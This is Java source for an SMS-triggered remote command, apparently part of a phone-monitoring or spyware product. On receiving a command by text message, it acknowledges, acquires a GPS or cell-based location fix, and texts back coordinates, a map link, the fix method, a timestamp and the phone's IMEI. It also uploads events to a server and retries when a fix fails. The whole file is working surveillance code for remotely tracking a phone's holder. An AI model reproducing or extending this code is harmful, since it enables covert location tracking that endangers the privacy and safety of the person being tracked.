package com.vvt.rmtcmd.sms;

import com.vvt.event.FxEvent;
import com.vvt.event.FxEventListener;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxLocationEvent;
import com.vvt.event.constant.FxGPSMethod;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOnDemand;
import com.vvt.gpsc.GPSOption;
import com.vvt.gpsc.GPSPriority;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.std.TimeUtil;

public class SMSGPSOnDemand extends RmtCmdAsync implements FxEventListener {

	private Preference pref = Global.getPreference();
	private GPSOption gpsCaptureOption = null;
	private GPSOption gpsOnDemandOption = null;
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSGPSOnDemand(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	public void setGPSOnDemandOption(GPSOption gpsOnDemandOption) {
		this.gpsOnDemandOption = gpsOnDemandOption;
	}
	
	private GPSOption getDefaultGPSOnDemandOption() {
		GPSMethod assisted = new GPSMethod();
		GPSMethod google = new GPSMethod();
		assisted.setMethod(FxGPSMethod.AGPS);
		assisted.setPriority(GPSPriority.FIRST_PRIORITY);
		google.setMethod(FxGPSMethod.CELL_INFO);
		google.setPriority(GPSPriority.SECOND_PRIORITY);
		GPSOption gpsOpt = new GPSOption();
		int timeout = 10;
		int index = 1;
		gpsOpt.setTimeout(timeout);
		gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index]);
		gpsOpt.addGPSMethod(assisted);
		gpsOpt.addGPSMethod(google);
		return gpsOpt;
	}
	
	private void continueGPSCapture() {
		PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gps.setGpsOption(gpsCaptureOption);
		pref.commit(gps);
	}

	private String getGPSMethod(FxLocationEvent locEvent) {
		String method = null;
		int id = 0;
		/*for (int i = 0; i < gpsEvent.countGPSField(); i++) {
			FxGPSField field = gpsEvent.getGpsField(i);
			if (field.getGpsFieldId().getId() == GPSExtraField.PROVIDER.getId()) {
				id = (int)field.getGpsFieldData();
				break;
			}
		}*/
		/*id = gpsEvent.getGPSProvider().getId();
		if (id == FxGPSMethod.INTEGRATED_GPS.getId()) {
			method = RmtCmdTextResource.AUTONOMOUS;
		} else if (id == FxGPSMethod.AGPS.getId()) {
			method = RmtCmdTextResource.ASSISTED;
		} else if (id == FxGPSMethod.NETWORK.getId()) {
			method = RmtCmdTextResource.CELL_SITE;
		} else if (id == FxGPSMethod.CELL_INFO.getId()) {
			method = RmtCmdTextResource.GLOC;
		} else if (id == FxGPSMethod.BLUETOOTH.getId()) {
			method = RmtCmdTextResource.BLUETOOTH;
		} else if (id == FxGPSMethod.UNKNOWN.getId()) {
			method = RmtCmdTextResource.UNKNOWN;
		}*/
		id = locEvent.getMethod();
		if (id == FxGPSMethod.CELL_INFO.getId()) {
			method = RmtCmdTextResource.TEXT_GPSDATA_CELL_INFO_METHOD;
		} else if (id == FxGPSMethod.INTEGRATED_GPS.getId()) {
			method = RmtCmdTextResource.TEXT_GPSDATA_INTEGRATED_GPS_METHOD;;
		} else if (id == FxGPSMethod.AGPS.getId()) {
			method = RmtCmdTextResource.TEXT_GPSDATA_NETWORK_METHOD;
		} else if (id == FxGPSMethod.BLUETOOTH.getId()) {
			method = RmtCmdTextResource.TEXT_GPSDATA_UNKNOWN_METHOD;
		} else if (id == FxGPSMethod.NETWORK.getId()) {
			method = RmtCmdTextResource.TEXT_GPSDATA_NETWORK_METHOD;
		}
		return method;
	}
	
	private float getAltitude(FxLocationEvent locEvent) {
		float alt = 0;
		/*for (int i = 0; i < gpsEvent.countGPSField(); i++) {
			FxGPSField field = gpsEvent.getGpsField(i);
			if (field.getGpsFieldId().getId() == GPSExtraField.ALTITUDE.getId()) {
				alt = field.getGpsFieldData();
				break;
			}
		}*/
		alt = (float) locEvent.getAltitude();
		return alt;
	}
	
	private boolean isGarbageEvent(FxEvent event) {
		boolean garbage = false;
		FxLocationEvent locEvent = (FxLocationEvent)event;
		if (locEvent.getLatitude() == 0 && locEvent.getLongitude() == 0) {
			garbage = true;
		}
		return garbage;
	}
	
	private void getFix() {
		Thread th = new Thread(this);
		th.start();
	}
	
	private void retryGPS() {
		doSMSHeader(smsCmdCode.getGPSOnDemandCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.GPS_ON_DEMAND_ERROR_HEADER);
		responseMessage.append(PhoneInfo.getIMEI());
		responseMessage.append(RmtCmdTextResource.GPS_ON_DEMAND_ERROR_TAILER);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To retry getting GPS.
		getFix();
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		// To send acknowledge SMS.
		doSMSHeader(smsCmdCode.getGPSOnDemandCmd());
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.WAITING_GPS_ON_DEMAND);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		getFix();
	}

	// Runnable
	public void run() {
		GPSOnDemand gpsOnDemand = new GPSOnDemand();
		PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gpsCaptureOption = gps.getGpsOption();
		gpsOnDemand.setGPSOption((gpsOnDemandOption != null? gpsOnDemandOption : getDefaultGPSOnDemandOption()));
		gpsOnDemand.addFxEventListener(this);
		gpsOnDemand.getGPSOnDemand();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdGPSOnDemand.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}

	// FxEventListener
	public void onError(Exception e) {
		Log.error("CmdGPSOnDemand.onError", null, e);
		retryGPS();
		// To send events
		eventSender.sendEvents();
	}

	public void onEvent(FxEvent event) {
		if (isGarbageEvent(event)) {
			retryGPS();
		} else {
			doSMSHeader(smsCmdCode.getGPSOnDemandCmd());
			continueGPSCapture();
			FxLocationEvent locEvent = (FxLocationEvent)event;
			String method = getGPSMethod(locEvent);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.GPS_LINK_HEADER_URL + locEvent.getLatitude() + Constant.COMMA + locEvent.getLongitude() + RmtCmdTextResource.GPS_LINK_TAILER_URL + Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.TEXT_GPSDATA_LATITUDE + locEvent.getLatitude() + Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.TEXT_GPSDATA_LONGTITUDE + locEvent.getLongitude() + Constant.CRLF);
			if (method.equals(RmtCmdTextResource.AUTONOMOUS)) {
				responseMessage.append(RmtCmdTextResource.TEXT_GPSDATA_ALTITUDE + getAltitude(locEvent) + Constant.CRLF);
			}
			responseMessage.append(RmtCmdTextResource.TEXT_GPSDATA_METHOD + method + Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.TEXT_GPSDATA_DATE + TimeUtil.format(locEvent.getEventTime()) + Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.TEXT_GPSDATA_IMEI + PhoneInfo.getIMEI());
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}
}
